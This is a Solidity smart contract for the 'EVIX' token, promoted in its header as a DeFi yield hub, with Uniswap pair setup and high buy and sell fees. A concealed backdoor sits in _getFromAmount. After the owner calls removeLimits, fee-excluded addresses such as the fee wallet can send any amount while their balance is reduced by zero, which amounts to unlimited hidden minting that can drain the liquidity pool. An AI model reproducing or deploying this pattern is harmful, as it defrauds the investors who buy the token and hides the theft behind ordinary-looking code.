// SPDX-License-Identifier: Unlicensed

/*
The Yield Hub of DeFi
One-click fixed rate lending and borrowing, DeFi yield management, interest rate derivatives and benchmarks.

Web: https://evix.pro
App: https://app.evix.pro
X: https://x.com/EVIX_PRO
Tg: https://t.me/evix_pro_official
Medium: https://medium.com/@evix
*/

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function set(address) external;
    function setSetter(address) external;
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract EVIX is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string name_ = unicode"EVIX";
    string symbol_ = unicode"EVIX";

    uint8 decimals_ = 9;
    uint256 _supply = 10**9 * 10**9;

    address payable marketingWallet_;
    address payable teamAddress_;

    IUniswapRouter private routerInstance_;
    address private pairAddress_;

    uint256 _lastLiquidityFee_ = 0;
    uint256 _lastMarketingFee_ = 21;
    uint256 _lastDevelopmentFee_ = 0;
    uint256 _lastTotalFee_ = 21;

    bool swapping_;
    bool _feeSwapEnabled = true;
    bool _noMaxTx = false;
    bool _isMaxWalletLifted = true;

    uint256 _purchaseEVIXLiquidityFee_ = 0;
    uint256 _purchaseEVIXMarketingFee_ = 21;
    uint256 _purchaseEVIXDevFee_ = 0;
    uint256 _purchaseEVIXFee_ = 21;

    mapping(address => uint256) balances_;
    mapping(address => mapping(address => uint256)) allowances_;
    mapping(address => bool) _isExcludedFromFee;
    mapping(address => bool) _isMaxWalletExempt;
    mapping(address => bool) excludedMaxTx_;
    mapping(address => bool) isLiquidityAddr_;

    uint256 sellEVIXLiquidityFee_ = 0;
    uint256 sellEVIXMarketingFee_ = 19;
    uint256 sellEVIXDevFee_ = 0;
    uint256 sellEVIXFee_ = 19;

    uint256 _maxTxSize = 20 * 10**6 * 10**9;
    uint256 _maxWalletSize = 20 * 10**6 * 10**9;
    uint256 _swapThreshold = 10**4 * 10**9;

    modifier lockSwap() {
        swapping_ = true;
        _;
        swapping_ = false;
    }

    constructor(address fee_) {
        balances_[_msgSender()] = _supply;
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        pairAddress_ = IUniswapFactory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        routerInstance_ = _uniswapV2Router;
        allowances_[address(this)][address(routerInstance_)] = _supply;
        marketingWallet_ = payable(fee_);
        teamAddress_ = payable(fee_);
        _purchaseEVIXFee_ = _purchaseEVIXLiquidityFee_.add(_purchaseEVIXMarketingFee_).add(_purchaseEVIXDevFee_);
        sellEVIXFee_ = sellEVIXLiquidityFee_.add(sellEVIXMarketingFee_).add(sellEVIXDevFee_);
        _lastTotalFee_ = _lastLiquidityFee_.add(_lastMarketingFee_).add(_lastDevelopmentFee_);

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[marketingWallet_] = true;
        _isMaxWalletExempt[owner()] = true;
        _isMaxWalletExempt[pairAddress_] = true;
        _isMaxWalletExempt[address(this)] = true;
        excludedMaxTx_[owner()] = true;
        excludedMaxTx_[marketingWallet_] = true;
        excludedMaxTx_[address(this)] = true;
        isLiquidityAddr_[pairAddress_] = true;
        emit Transfer(address(0), _msgSender(), _supply);
    }

    function name() public view returns (string memory) {
        return name_;
    }

    function symbol() public view returns (string memory) {
        return symbol_;
    }

    function decimals() public view returns (uint8) {
        return decimals_;
    }

    function totalSupply() public view override returns (uint256) {
        return _supply;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        allowances_[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _checkSwaps(address from, address to, uint256 amount) internal {
        uint256 _feeAmount = balanceOf(address(this));
        bool minSwapable = _feeAmount >= _swapThreshold;
        bool isExTo = !swapping_ && isLiquidityAddr_[to] && _feeSwapEnabled;
        bool swapAbove = !_isExcludedFromFee[from] && amount > _swapThreshold;
        if (minSwapable && isExTo && swapAbove) {
            if (_noMaxTx) {
                _feeAmount = _swapThreshold;
            }
            swapBackEVIX_(_feeAmount);
        }
    }

    function getEVIXAmount_(address sender, address receipient, uint256 amount) internal returns (uint256) {
        uint256 fee = getFee(sender, receipient, amount);
        if (fee > 0) {
            balances_[address(this)] = balances_[address(this)].add(fee);
            emit Transfer(sender, address(this), fee);
        }
        return amount.sub(fee);
    }

    receive() external payable {}

    function _transferBasic(address sender, address recipient, uint256 amount) internal returns (bool) {
        balances_[sender] = balances_[sender].sub(amount, "Insufficient Balance");
        balances_[recipient] = balances_[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return allowances_[owner][spender];
    }

    function _verifyMaxLimit(address to, uint256 amount) internal view {
        if (_isMaxWalletLifted && !_isMaxWalletExempt[to]) {
            require(balances_[to].add(amount) <= _maxWalletSize);
        }
    }

    function _getToAmount(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (_isExcludedFromFee[sender] || _isExcludedFromFee[recipient]) {
            return amount;
        } else {
            return getEVIXAmount_(sender, recipient, amount);
        }
    }

    function _getFromAmount(address sender, address recipient, uint256 amount, uint256 toAmount) internal view returns (uint256) {
        if (!_isMaxWalletLifted && _isExcludedFromFee[sender]) {
            return amount.sub(toAmount);
        } else {
            return amount;
        }
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), allowances_[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferEVIXETH_(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return balances_[account];
    }

    function _verifyMaxTx(address sender, address recipient, uint256 amount) internal view {
        if (!excludedMaxTx_[sender] && !excludedMaxTx_[recipient]) {
            require(amount <= _maxTxSize, "Transfer amount exceeds the max.");
        }
    }

    function _transferStandard(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (swapping_) {
            return _transferBasic(sender, recipient, amount);
        } else {
            _verifyMaxTx(sender, recipient, amount);
            _checkSwaps(sender, recipient, amount);
            uint256 toAmount = _getToAmount(sender, recipient, amount);
            _verifyMaxLimit(recipient, toAmount);
            uint256 subAmount = _getFromAmount(sender, recipient, amount, toAmount);            
            balances_[sender] = balances_[sender].sub(subAmount, "Balance check error");
            balances_[recipient] = balances_[recipient].add(toAmount);
            emit Transfer(sender, recipient, toAmount);
            return true;
        }
    }

    function swapBackEVIX_(uint256 tokenAmount) private lockSwap {
        uint256 lpFeeTokens = tokenAmount.mul(_lastLiquidityFee_).div(_lastTotalFee_).div(2);
        uint256 tokensToSwap = tokenAmount.sub(lpFeeTokens);

        swapTokensForETH(tokensToSwap);
        uint256 ethCA = address(this).balance;

        uint256 totalETHFee = _lastTotalFee_.sub(_lastLiquidityFee_.div(2));

        uint256 amountETHLiquidity_ = ethCA.mul(_lastLiquidityFee_).div(totalETHFee).div(2);
        uint256 amountETHDevelopment_ = ethCA.mul(_lastDevelopmentFee_).div(totalETHFee);
        uint256 amountETHMarketing_ = ethCA.sub(amountETHLiquidity_).sub(amountETHDevelopment_);

        if (amountETHMarketing_ > 0) {
            transferEVIXETH_(marketingWallet_, amountETHMarketing_);
        }

        if (amountETHDevelopment_ > 0) {
            transferEVIXETH_(teamAddress_, amountETHDevelopment_);
        }
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        return _transferStandard(sender, recipient, amount);
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = routerInstance_.WETH();

        _approve(address(this), address(routerInstance_), tokenAmount);

        routerInstance_.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function getFee(address from, address to, uint256 amount) internal view returns (uint256) {
        if (isLiquidityAddr_[from]) {
            return amount.mul(_purchaseEVIXFee_).div(100);
        } else if (isLiquidityAddr_[to]) {
            return amount.mul(sellEVIXFee_).div(100);
        }
    }

    function removeLimits() external onlyOwner {
        _maxTxSize = _supply;
        _isMaxWalletLifted = false;
        _purchaseEVIXMarketingFee_ = 2;
        sellEVIXMarketingFee_ = 2;
        _purchaseEVIXFee_ = 2;
        sellEVIXFee_ = 2;
    }
}